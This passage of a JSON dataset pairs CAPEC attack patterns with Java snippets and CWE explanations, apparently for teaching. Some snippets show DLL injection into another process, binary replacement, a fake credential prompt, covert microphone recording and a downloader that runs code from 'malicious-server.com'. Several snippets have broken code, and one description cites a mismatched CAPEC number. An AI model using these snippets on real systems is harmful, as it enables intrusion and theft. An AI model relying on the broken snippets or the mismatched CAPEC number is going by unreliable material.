        "code_snippet": "import com.sun.jna.Library;\nimport com.sun.jna.Native;\nimport com.sun.jna.Pointer;\n\npublic class DLLInjectionExample {\n    public interface Kernel32 extends Library {\n        Kernel32 INSTANCE = (Kernel32) Native.loadLibrary(\"kernel32\", Kernel32.class);\n        Pointer OpenProcess(int dwDesiredAccess, boolean bInheritHandle, int dwProcessId);\n        boolean WriteProcessMemory(Pointer hProcess, Pointer lpBaseAddress, byte[] lpBuffer, int nSize, int[] lpNumberOfBytesWritten);\n        boolean CreateRemoteThread(Pointer hProcess, Pointer lpThreadAttributes, int dwStackSize, Pointer lpStartAddress, Pointer lpParameter, int dwCreationFlags, Pointer lpThreadId);\n    }\n\n    public static void main(String[] args) {\n        int processId = 1234; // Target process ID\n        String dllPath = \"C:\\\\path\\\\to\\\\malicious.dll\";\n\n        Pointer process = Kernel32.INSTANCE.OpenProcess(0x1F0FFF, false, processId);\n        if (process == null) {\n            System.out.println(\"Failed to open process\");\n            return;\n        }\n\n        byte[] dllBytes = dllPath.getBytes();\n        Pointer remoteMemory = Kernel32.INSTANCE.VirtualAllocEx(process, null, dllBytes.length, 0x3000, 0x40);\n        Kernel32.INSTANCE.WriteProcessMemory(process, remoteMemory, dllBytes, dllBytes.length, null);\n\n        Pointer loadLibraryAddr = Kernel32.INSTANCE.GetProcAddress(Kernel32.INSTANCE.GetModuleHandle(\"kernel32.dll\"), \"LoadLibraryA\");\n        Kernel32.INSTANCE.CreateRemoteThread(process, null, 0, loadLibraryAddr, remoteMemory, 0, null);\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of DLL injection, a technique where an attacker injects a malicious DLL into a running process. The code uses the Java Native Access (JNA) library to interact with Windows API functions. It opens a target process, allocates memory within that process, writes the path of the malicious DLL into the allocated memory, and then creates a remote thread to execute the DLL within the context of the target process. This embodies the CAPEC 'Inclusion of Code in Existing Process' by showing how an attacker can execute arbitrary code in the address space of a separate live process, potentially evading detection and escalating privileges. The related CWEs are represented by the inclusion of untrusted functionality (CWE-829), improper control of dynamically-managed code resources (CWE-913), and the potential for embedded malicious code (CWE-506)."
    },
    {
        "capec_id": "641",
        "capec_name": "DLL Side-Loading",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class DLLSideLoadingExample {\n    public static void main(String[] args) {\n        String dllName = \"example.dll\";\n        String[] searchPaths = {\"C:\\\\Program Files\\\\App\\\\\", \"C:\\\\Windows\\\\System32\\\\\", \"C:\\\\Temp\\\\\"};\n\n        for (String path : searchPaths) {\n            File dllFile = new File(path + dllName);\n            if (dllFile.exists()) {\n                try {\n                    // Simulate loading the DLL\n                    byte[] dllContent = Files.readAllBytes(Paths.get(dllFile.getAbsolutePath()));\n                    System.out.println(\"Loaded DLL from: \" + dllFile.getAbsolutePath());\n                    break;\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified example of DLL side-loading vulnerability. The code searches for a DLL named 'example.dll' in a predefined set of directories: 'C:\\Program Files\\App\\', 'C:\\Windows\\System32\\', and 'C:\\Temp\\'. If the DLL is found in any of these directories, it simulates loading the DLL by reading its content. This example embodies the main idea of CAPEC-471 (DLL Side-Loading) by showing how an application might search for and load a DLL from multiple directories, potentially including untrusted locations like 'C:\\Temp\\'. This can lead to vulnerabilities described in related CWEs, such as CWE-427 (Uncontrolled Search Path Element) and CWE-426 (Untrusted Search Path), where an attacker could place a malicious DLL in one of these directories to be loaded by the application."
    },
    {
        "capec_id": "642",
        "capec_name": "Replace Binaries",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class VulnerableBinaryReplacement {\n    public static void main(String[] args) {\n        String binaryPath = \"/usr/local/bin/importantBinary\";\n        String maliciousBinaryPath = \"/tmp/maliciousBinary\";\n\n        // CWE-732: Incorrect Permission Assignment for Critical Resource\n        File binaryFile = new File(binaryPath);\n        if (binaryFile.exists() && binaryFile.canWrite()) {\n            try {\n                // CWE-426: Untrusted Search Path\n                // CWE-78: OS Command Injection\n                // CWE-428: Unquoted Search Path or Element\n                // CWE-506: Embedded Malicious Code\n                Files.copy(Paths.get(maliciousBinaryPath), Paths.get(binaryPath), java.nio.file.StandardCopyOption.REPLACE_EXISTING);\n                System.out.println(\"Binary replaced successfully.\");\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        } else {\n            System.out.println(\"Binary is not writable or does not exist.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable scenario where an important binary file can be replaced by a malicious binary due to incorrect file permissions (CWE-732). The code checks if the binary file is writable and then replaces it with a malicious binary from a potentially untrusted path (CWE-426). The replacement process does not properly handle special elements in the file paths (CWE-78) and uses an unquoted search path (CWE-428). The malicious binary could contain embedded malicious code (CWE-506). This snippet embodies the main idea of the CAPEC 'Replace Binaries' by showing how an adversary could exploit weak file permissions to replace a critical binary with malware."
    },
    {
        "capec_id": "643",
        "capec_name": "Identify Shared Files/Directories on System",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class SharedDirectoryScanner {\n    public static void main(String[] args) {\n        String sharedDirPath = \"\\\\UNC\\share\\name\\\";\n        File sharedDir = new File(sharedDirPath);\n\n        if (sharedDir.exists() && sharedDir.isDirectory()) {\n            File[] files = sharedDir.listFiles();\n            if (files != null) {\n                for (File file : files) {\n                    try {\n                        String content = new String(Files.readAllBytes(Paths.get(file.getPath())));\n                        System.out.println(\"File: \" + file.getName() + \"\\nContent: \" + content);\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            }\n        } else {\n            System.out.println(\"Shared directory does not exist or is not a directory.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how an adversary might identify and access shared files or directories on a system, which aligns with the CAPEC description. The code attempts to access a shared directory specified by a UNC path (CWE-40) and lists all files within it. For each file, it reads and prints the content, potentially exposing sensitive information (CWE-200, CWE-552). The code does not perform any privilege checks, which could allow unauthorized access to sensitive files (CWE-267). Additionally, the use of a fixed path for the shared directory (CWE-427) can be exploited if the path is controlled by an unintended actor."
    },
    {
        "capec_id": "644",
        "capec_name": "Use of Captured Hashes (Pass The Hash)",
        "code_snippet": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class PassTheHashExample {\n    private static Map<String, String> userDatabase = new HashMap<>();\n\n    public static void main(String[] args) throws NoSuchAlgorithmException {\n        // Storing user credentials as password hashes\n        String username = \"user1\";\n        String password = \"password123\";\n        String passwordHash = hashPassword(password);\n        userDatabase.put(username, passwordHash);\n\n        // Simulating an attacker capturing the hash\n        String capturedHash = passwordHash;\n\n        // Using the captured hash to authenticate\n        if (authenticate(username, capturedHash)) {\n            System.out.println(\"Authentication successful using captured hash!\");\n        } else {\n            System.out.println(\"Authentication failed.\");\n        }\n    }\n\n    private static String hashPassword(String password) throws NoSuchAlgorithmException {\n        MessageDigest md = MessageDigest.getInstance(\"SHA-256\");\n        byte[] hashBytes = md.digest(password.getBytes());\n        StringBuilder sb = new StringBuilder();\n        for (byte b : hashBytes) {\n            sb.append(String.format(\"%02x\", b));\n        }\n        return sb.toString();\n    }\n\n    private static boolean authenticate(String username, String passwordHash) {\n        String storedHash = userDatabase.get(username);\n        return storedHash != null && storedHash.equals(passwordHash);\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of the 'Pass The Hash' attack. It stores user credentials as password hashes and simulates an attacker capturing a hash. The attacker then uses the captured hash to authenticate successfully. The code highlights several weaknesses: storing password hashes (CWE-836), insufficiently protected credentials (CWE-522), and the potential for authentication bypass by capture-replay (CWE-294). The use of single-factor authentication (CWE-308) is also implied, as no additional authentication factors are used."
    },
    {
        "capec_id": "645",
        "capec_name": "Use of Captured Tickets (Pass The Ticket)",
        "code_snippet": "import java.io.*;\nimport java.net.*;\nimport javax.crypto.*;\nimport javax.crypto.spec.SecretKeySpec;\n\npublic class KerberosTicketReplay {\n    private static final String SECRET_KEY = \"1234567890123456\"; // Insecure key\n\n    public static void main(String[] args) throws Exception {\n        // Simulate capturing a Kerberos ticket\n        byte[] capturedTicket = captureTicket();\n\n        // Replay the captured ticket to authenticate\n        authenticateWithTicket(capturedTicket);\n    }\n\n    private static byte[] captureTicket() throws Exception {\n        // Simulate capturing a ticket from the network (insecure transmission)\n        Socket socket = new Socket(\"localhost\", 8080);\n        InputStream in = socket.getInputStream();\n        byte[] ticket = new byte[256];\n        in.read(ticket);\n        socket.close();\n        return ticket;\n    }\n\n    private static void authenticateWithTicket(byte[] ticket) throws Exception {\n        // Simulate using the captured ticket to authenticate\n        SecretKeySpec keySpec = new SecretKeySpec(SECRET_KEY.getBytes(), \"AES\");\n        Cipher cipher = Cipher.getInstance(\"AES\");\n        cipher.init(Cipher.DECRYPT_MODE, keySpec);\n        byte[] decryptedTicket = cipher.doFinal(ticket);\n\n        // Insecurely authenticate using the decrypted ticket\n        System.out.println(\"Authenticated with ticket: \" + new String(decryptedTicket));\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of the 'Use of Captured Tickets (Pass The Ticket)' attack. The code simulates capturing a Kerberos ticket from the network and then reusing it to authenticate to a service. The code embodies several related CWEs: it uses an insecure method to transmit and store the ticket (CWE-522), allows for authentication bypass by replaying the captured ticket (CWE-294), and uses a single-factor authentication mechanism (CWE-308). The code also lacks proper entity authentication during key exchange (CWE-322), and does not correctly handle security identifiers (CWE-1292). This example highlights the vulnerabilities associated with improper handling and protection of authentication tickets in a Kerberos-based system."
    },
    {
        "capec_id": "646",
        "capec_name": "Peripheral Footprinting",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.List;\n\npublic class PeripheralFootprinting {\n    public static void main(String[] args) {\n        try {\n            // Example of searching for iOS backups\n            File backupDir = new File(System.getProperty(\"user.home\") + \"/AppData/Roaming/Apple Computer/MobileSync/Backup\");\n            if (backupDir.exists()) {\n                System.out.println(\"iOS backups found:\");\n                for (File file : backupDir.listFiles()) {\n                    System.out.println(file.getName());\n                }\n            }\n\n            // Example of analyzing Windows registry for USB devices\n            List<String> registryOutput = Files.readAllLines(Paths.get(\"C:\\\\Windows\\\\System32\\\\config\\\\SYSTEM\"));\n            for (String line : registryOutput) {\n                if (line.contains(\"USB\")) {\n                    System.out.println(\"USB device found: \" + line);\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Peripheral Footprinting' by attempting to obtain information about attached peripheral devices and components connected to a computer system. The code searches for iOS backups in a typical directory and analyzes the Windows registry to find connected USB devices. This represents the CAPEC's idea of gathering information about peripherals to gain insights into the system or network environment. The code also touches on related CWEs by potentially exposing sensitive information (CWE-200, CWE-497) and handling system-level information improperly (CWE-67)."
    },
    {
        "capec_id": "647",
        "capec_name": "Collect Data from Registries",
        "code_snippet": "import java.util.prefs.Preferences;\n\npublic class RegistryDataCollector {\n    public static void main(String[] args) {\n        // Accessing Windows Registry using Java Preferences API\n        Preferences systemRoot = Preferences.systemRoot();\n        Preferences userRoot = Preferences.userRoot();\n\n        // Collecting system-specific data\n        String osName = systemRoot.get(\"os.name\", \"Unknown\");\n        String userName = userRoot.get(\"user.name\", \"Unknown\");\n\n        // Storing sensitive information in cleartext\n        systemRoot.put(\"sensitive.data\", \"password123\");\n\n        // Printing collected data\n        System.out.println(\"OS Name: \" + osName);\n        System.out.println(\"User Name: \" + userName);\n    }\n}",
        "description": "This Java code snippet demonstrates how an adversary might exploit weaknesses in authorization to gather system-specific data and sensitive information from the Windows Registry using the Java Preferences API. The code accesses both system and user root preferences to collect data such as the operating system name and user name. It also stores sensitive information (a password) in cleartext within the registry, which is a security vulnerability. This example embodies the CAPEC 'Collect Data from Registries' and highlights related CWEs such as 'Improper Authorization' (CWE-285) and 'Cleartext Storage in the Registry' (CWE-314). The code illustrates how sensitive information can be exposed and improperly managed, leading to potential further attacks."
    },
    {
        "capec_id": "648",
        "capec_name": "Collect Data from Screen Capture",
        "code_snippet": "import java.awt.AWTException;\nimport java.awt.Rectangle;\nimport java.awt.Robot;\nimport java.awt.Toolkit;\nimport java.awt.image.BufferedImage;\nimport java.io.File;\nimport java.io.IOException;\nimport javax.imageio.ImageIO;\n\npublic class ScreenCapture {\n    public static void main(String[] args) {\n        try {\n            // Capture the screen\n            Robot robot = new Robot();\n            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());\n            BufferedImage screenFullImage = robot.createScreenCapture(screenRect);\n            \n            // Save the captured image to a file\n            File file = new File(\"screenshot.png\");\n            ImageIO.write(screenFullImage, \"png\", file);\n            System.out.println(\"A full screenshot saved!\");\n        } catch (AWTException | IOException ex) {\n            System.err.println(ex);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how an adversary could exploit the system's screen capture functionality to gather sensitive information. The code uses the `Robot` class to capture the entire screen and save it as a PNG file. This embodies the main idea of CAPEC-Collect Data from Screen Capture. The related CWEs provide additional context: CWE-267 (Privilege Defined With Unsafe Actions) is relevant because the code assumes the user has the necessary privileges to capture the screen, which could be exploited if misconfigured. CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) is also relevant as the captured screenshot could contain sensitive information that should not be exposed. CWE-319 (Cleartext Transmission of Sensitive Information) and CWE-294 (Authentication Bypass by Capture-replay) are not directly represented in this snippet but are related to the broader context of how captured data could be transmitted or used maliciously."
    },
    {
        "capec_id": "649",
        "capec_name": "Adding a Space to a File Extension",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\n\npublic class FileUploadHandler {\n    public static void main(String[] args) {\n        String uploadedFileName = \"example.txt \"; // File name with trailing space\n        handleFileUpload(uploadedFileName);\n    }\n\n    public static void handleFileUpload(String fileName) {\n        // Check if the file extension is .txt\n        if (fileName.endsWith(\".txt\")) {\n            System.out.println(\"Processing as a text file: \" + fileName);\n            // Simulate processing the file\n        } else {\n            System.out.println(\"Unsupported file type: \" + fileName);\n        }\n\n        // Attempt to create a file with the given name\n        File file = new File(fileName);\n        try {\n            if (file.createNewFile()) {\n                System.out.println(\"File created: \" + file.getName());\n            } else {\n                System.out.println(\"File already exists.\");\n            }\n        } catch (IOException e) {\n            System.out.println(\"An error occurred.\");\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where a file with a trailing space in its extension is processed incorrectly. The `handleFileUpload` method checks if the file name ends with `.txt` to determine if it should be processed as a text file. However, due to the trailing space, the file name `example.txt ` is not correctly identified as a text file, leading to potential misclassification and improper handling. Additionally, the code attempts to create a file with the given name, which could lead to ambiguous path resolution and unintended file access. This snippet embodies the main idea of the CAPEC by showing how trailing spaces in file names can be exploited, and it relates to the listed CWEs by demonstrating reliance on file name extensions and path equivalence issues."
    },
    {
        "capec_id": "650",
        "capec_name": "Upload a Web Shell to a Web Server",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class FileUploadServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        Part filePart = request.getPart(\"file\"); // Retrieves <input type=\"file\" name=\"file\">\n        String fileName = getFileName(filePart);\n        File uploads = new File(\"/var/www/uploads\");\n        File file = new File(uploads, fileName);\n        try (InputStream input = filePart.getInputStream()) {\n            Files.copy(input, file.toPath());\n        }\n        response.getWriter().println(\"File uploaded successfully!\");\n    }\n\n    private String getFileName(Part part) {\n        for (String content : part.getHeader(\"content-disposition\").split(\";\")) {\n            if (content.trim().startsWith(\"filename\")) {\n                return content.substring(content.indexOf('=') + 1).trim().replace(\"\\\"\", \"\");\n            }\n        }\n        return null;\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable file upload functionality. The servlet allows users to upload files to the server without proper validation or authentication, embodying the main idea of CAPEC-152: 'Upload a Web Shell to a Web Server'. The code retrieves the uploaded file from the request and saves it to the '/var/www/uploads' directory. This can lead to several vulnerabilities as described by the related CWEs: \n- CWE-287: Improper Authentication - The code does not verify the identity of the user uploading the file.\n- CWE-434: Unrestricted Upload of File with Dangerous Type - The code does not validate the file type, allowing potentially dangerous files to be uploaded.\n- CWE-553: Command Shell in Externally Accessible Directory - The uploaded file could be a web shell placed in an accessible directory, allowing remote command execution.\n- CWE-602: Client-Side Enforcement of Server-Side Security - The code relies on client-side mechanisms to enforce security, which can be easily bypassed.\n- CWE-535: Exposure of Information Through Shell Error Message - If an error occurs, it might expose sensitive information through error messages."
    },
    {
        "capec_id": "651",
        "capec_name": "Eavesdropping",
        "code_snippet": "import javax.sound.sampled.*;\nimport java.io.*;\n\npublic class EavesdroppingExample {\n    public static void main(String[] args) {\n        try {\n            AudioFormat format = new AudioFormat(16000, 8, 2, true, true);\n            DataLine.Info info = new DataLine.Info(TargetDataLine.class, format);\n            if (!AudioSystem.isLineSupported(info)) {\n                System.out.println(\"Line not supported\");\n                return;\n            }\n            TargetDataLine microphone = (TargetDataLine) AudioSystem.getLine(info);\n            microphone.open(format);\n            microphone.start();\n\n            ByteArrayOutputStream out = new ByteArrayOutputStream();\n            byte[] buffer = new byte[1024];\n            System.out.println(\"Recording...\");\n            for (int i = 0; i < 100; i++) { // Record for a short period\n                int bytesRead = microphone.read(buffer, 0, buffer.length);\n                out.write(buffer, 0, bytesRead);\n            }\n            microphone.close();\n            byte[] audioData = out.toByteArray();\n\n            // Simulate sending the recorded data in cleartext\n            FileOutputStream fos = new FileOutputStream(\"recordedAudio.raw\");\n            fos.write(audioData);\n            fos.close();\n            System.out.println(\"Audio data saved to recordedAudio.raw\");\n        } catch (LineUnavailableException | IOException ex) {\n            ex.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of eavesdropping by recording audio from a microphone and saving it to a file. The code uses the javax.sound.sampled package to capture audio data from the system's microphone. The recorded audio is then saved in cleartext to a file named 'recordedAudio.raw'. This example embodies the main idea of CAPEC-173 (Eavesdropping) by showing how an adversary could intercept and store raw audio data. The code also touches on related CWEs such as CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-319 (Cleartext Transmission of Sensitive Information) by saving the captured audio data in an unprotected format, making it accessible to unauthorized actors."
    },
    {
        "capec_id": "652",
        "capec_name": "Use of Known Kerberos Credentials",
        "code_snippet": "import java.io.*;\nimport java.net.*;\nimport java.util.Base64;\n\npublic class KerberosAuth {\n    private static final String KERBEROS_SERVER = \"http://example.com/kerberos\";\n    private static final String USERNAME = \"user\";\n    private static final String PASSWORD = \"password\";\n\n    public static void main(String[] args) {\n        try {\n            String credentials = Base64.getEncoder().encodeToString((USERNAME + \":\" + PASSWORD).getBytes());\n            URL url = new URL(KERBEROS_SERVER);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            connection.setRequestProperty(\"Authorization\", \"Basic \" + credentials);\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode == 200) {\n                System.out.println(\"Authenticated successfully\");\n            } else {\n                System.out.println(\"Authentication failed\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic authentication mechanism using Kerberos credentials. The code sends a Base64-encoded username and password to a Kerberos server for authentication. This example embodies the CAPEC 'Use of Known Kerberos Credentials' by showing how an adversary could use stolen or purchased credentials to gain authenticated access. The code also highlights several related CWEs: CWE-522 (Insufficiently Protected Credentials) by transmitting credentials in an insecure manner, CWE-308 (Use of Single-factor Authentication) by relying solely on a username and password, and CWE-294 (Authentication Bypass by Capture-replay) by not protecting against replay attacks. The code is intentionally vulnerable to illustrate these weaknesses."
    },
    {
        "capec_id": "653",
        "capec_name": "Use of Known Operating System Credentials",
        "code_snippet": "import java.util.Scanner;\n\npublic class VulnerableLogin {\n    private static final String USERNAME = \"admin\";\n    private static final String PASSWORD = \"password123\";\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter username: \");\n        String inputUsername = scanner.nextLine();\n        System.out.print(\"Enter password: \");\n        String inputPassword = scanner.nextLine();\n\n        if (authenticate(inputUsername, inputPassword)) {\n            System.out.println(\"Access granted.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        return USERNAME.equals(username) && PASSWORD.equals(password);\n    }\n}",
        "description": "This Java code snippet represents a simple and vulnerable login system. It embodies the main idea of CAPEC-Use of Known Operating System Credentials by using hardcoded credentials (USERNAME and PASSWORD) for authentication. The code is vulnerable to several CWE weaknesses:\n\n1. CWE-522: Insufficiently Protected Credentials - The credentials are hardcoded and not protected, making them susceptible to unauthorized access.\n2. CWE-307: Improper Restriction of Excessive Authentication Attempts - The code does not implement any measures to prevent brute force attacks, allowing unlimited login attempts.\n3. CWE-308: Use of Single-factor Authentication - The authentication mechanism relies solely on a username and password, which is a single factor of authentication.\n4. CWE-309: Use of Password System for Primary Authentication - The primary means of authentication is a password system, which has inherent flaws.\n5. CWE-262: Not Using Password Aging - There is no mechanism for managing password aging.\n6. CWE-263: Password Aging with Long Expiration - Although not directly shown, the hardcoded password implies no expiration policy.\n7. CWE-654: Reliance on a Single Factor in a Security Decision - The decision to grant access is based solely on the evaluation of the username and password, a single condition."
    },
    {
        "capec_id": "654",
        "capec_name": "Credential Prompt Impersonation",
        "code_snippet": "import javax.swing.*;\nimport java.awt.*;\nimport java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\n\npublic class CredentialPromptImpersonation {\n    public static void main(String[] args) {\n        JFrame frame = new JFrame(\"Login\");\n        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n        frame.setSize(300, 150);\n\n        JPanel panel = new JPanel();\n        frame.add(panel);\n        placeComponents(panel);\n\n        frame.setVisible(true);\n    }\n\n    private static void placeComponents(JPanel panel) {\n        panel.setLayout(null);\n\n        JLabel userLabel = new JLabel(\"User\");\n        userLabel.setBounds(10, 20, 80, 25);\n        panel.add(userLabel);\n\n        JTextField userText = new JTextField(20);\n        userText.setBounds(100, 20, 165, 25);\n        panel.add(userText);\n\n        JLabel passwordLabel = new JLabel(\"Password\");\n        passwordLabel.setBounds(10, 50, 80, 25);\n        panel.add(passwordLabel);\n\n        JPasswordField passwordText = new JPasswordField(20);\n        passwordText.setBounds(100, 50, 165, 25);\n        panel.add(passwordText);\n\n        JButton loginButton = new JButton(\"login\");\n        loginButton.setBounds(10, 80, 80, 25);\n        panel.add(loginButton);\n\n        loginButton.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                String user = userText.getText();\n                String password = new String(passwordText.getPassword());\n                // Simulate storing credentials insecurely\n                System.out.println(\"User: \" + user + \", Password: \" + password);\n            }\n        });\n    }\n}",
        "description": "This Java code snippet creates a simple GUI application that impersonates a login prompt. The application collects a username and password from the user and prints them to the console, simulating insecure storage of credentials. This example embodies the CAPEC 'Credential Prompt Impersonation' by creating a fake login interface to steal user credentials. It also touches on related CWEs: 'Improper Restriction of Rendered UI Layers or Frames' (CWE-1021) by not distinguishing the fake prompt from a legitimate one, 'Insufficiently Protected Credentials' (CWE-522) by printing credentials to the console, and 'Use of Weak Credentials' (CWE-1391) by not enforcing any password strength requirements."
    },
    {
        "capec_id": "655",
        "capec_name": "Avoid Security Tool Identification by Adding Data",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class VulnerableFileHandler {\n    public static void main(String[] args) {\n        String filePath = \"sensitive_data.txt\";\n        String tempFilePath = \"temp_data.txt\";\n        String sensitiveData = \"username=admin\\npassword=secret\";\n\n        // CWE-541: Inclusion of Sensitive Information in an Include File\n        try (FileWriter writer = new FileWriter(filePath)) {\n            writer.write(sensitiveData);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // CWE-434: Unrestricted Upload of File with Dangerous Type\n        File dangerousFile = new File(\"malicious.exe\");\n        try {\n            if (dangerousFile.createNewFile()) {\n                System.out.println(\"Dangerous file created.\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // CWE-532: Insertion of Sensitive Information into Log File\n        try (FileWriter logWriter = new FileWriter(\"log.txt\", true)) {\n            logWriter.write(\"Sensitive operation performed on file: \" + filePath + \"\\n\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // CWE-377: Insecure Temporary File\n        try (FileWriter tempWriter = new FileWriter(tempFilePath)) {\n            tempWriter.write(\"Temporary data\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // CAPEC: Avoid Security Tool Identification by Adding Data\n        try {\n            byte[] data = Files.readAllBytes(Paths.get(filePath));\n            byte[] padding = new byte[1024 * 1024]; // 1MB padding\n            Files.write(Paths.get(filePath), padding);\n            Files.write(Paths.get(filePath), data);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates several security vulnerabilities and the main idea of the CAPEC 'Avoid Security Tool Identification by Adding Data'. The code includes:\n\n1. **CWE-541**: Sensitive information (username and password) is written to an include file (`sensitive_data.txt`).\n2. **CWE-434**: A dangerous file (`malicious.exe`) is created without restriction.\n3. **CWE-532**: Sensitive information is logged to a log file (`log.txt`).\n4. **CWE-377**: An insecure temporary file (`temp_data.txt`) is created and used.\n5. **CAPEC**: The file size of `sensitive_data.txt` is increased by adding 1MB of padding data, which can help an adversary avoid detection by security tools that cannot handle large files. This also changes the file's hash, making it harder for security tools to identify the file based on known hashes."
    },
    {
        "capec_id": "656",
        "capec_name": "Voice Phishing",
        "code_snippet": "import java.util.Scanner;\n\npublic class VoicePhishingExample {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Welcome to Bank XYZ. Please enter your account number:\");\n        String accountNumber = scanner.nextLine();\n        System.out.println(\"Please enter your password:\");\n        String password = scanner.nextLine();\n        \n        // CWE-522: Insufficiently Protected Credentials\n        // Storing credentials in plain text (insecure)\n        String storedAccountNumber = accountNumber;\n        String storedPassword = password;\n        \n        // CWE-359: Exposure of Private Personal Information to an Unauthorized Actor\n        // Simulating exposure of sensitive information\n        System.out.println(\"Your account number is: \" + storedAccountNumber);\n        System.out.println(\"Your password is: \" + storedPassword);\n        \n        // CWE-940: Improper Verification of Source of a Communication Channel\n        // No verification of the caller's legitimacy\n        System.out.println(\"Thank you for providing your details. Our representative will contact you shortly.\");\n    }\n}",
        "description": "This Java code snippet simulates a Voice Phishing attack scenario. The user is prompted to enter their account number and password, which are then stored insecurely (CWE-522) and displayed back to the user (CWE-359), representing the exposure of sensitive information. The code does not verify the legitimacy of the communication channel (CWE-940), making it susceptible to Voice Phishing attacks. This example highlights the risks associated with improper handling and verification of sensitive information in a voice-based interaction."
    },
    {
        "capec_id": "657",
        "capec_name": "Malicious Automated Software Update via Spoofing",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousUpdate {\n    public static void main(String[] args) {\n        try {\n            // URL of the update server (spoofed by attacker)\n            URL url = new URL(\"http://malicious-server.com/update\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n\n            // Read the update file from the server\n            InputStream in = conn.getInputStream();\n            FileOutputStream out = new FileOutputStream(\"update.exe\");\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                out.write(buffer, bytesRead, bytesRead);\n            }\n            in.close();\n            out.close();\n\n            // Execute the downloaded update without integrity check\n            Runtime.getRuntime().exec(\"update.exe\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable software update mechanism that can be exploited by an attacker using spoofing techniques. The code downloads an update from a specified URL (which can be spoofed by an attacker) and executes it without performing any integrity checks. This embodies the CAPEC 'Malicious Automated Software Update via Spoofing' by showing how an attacker can trick a client into downloading and executing a malicious update. The related CWEs are represented as follows: CWE-494 (Download of Code Without Integrity Check) is shown by the lack of verification of the downloaded file, CWE-506 (Embedded Malicious Code) is implied by the potential malicious nature of the downloaded file, and CWE-602 (Client-Side Enforcement of Server-Side Security) is represented by the client trusting the server without proper validation."
    },
    {
        "capec_id": "660",
        "capec_name": "Root/Jailbreak Detection Evasion via Hooking",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.URL;\nimport java.net.URLConnection;\n\npublic class JailbreakDetectionEvasion {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://example.com/malicious_code.jar\");\n            URLConnection connection = url.openConnection();\n            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            String inputLine;\n            StringBuilder code = new StringBuilder();\n            while ((inputLine = in.readLine()) != null) {\n                code.append(inputLine);\n            }\n            in.close();\n\n            // Simulate loading the downloaded code (CWE-829)\n            // This is a placeholder for actual code loading logic\n            executeCode(code.toString());\n\n            // Bypass Root/Jailbreak detection (CWE-497)\n            if (isRooted()) {\n                System.out.println(\"Device is rooted, but bypassing detection.\");\n            } else {\n                System.out.println(\"Device is not rooted.\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void executeCode(String code) {\n        // Placeholder for executing the downloaded code\n        System.out.println(\"Executing downloaded code: \" + code);\n    }\n\n    private static boolean isRooted() {\n        // Placeholder for root detection logic\n        // CWE-78: OS Command Injection vulnerability\n        try {\n            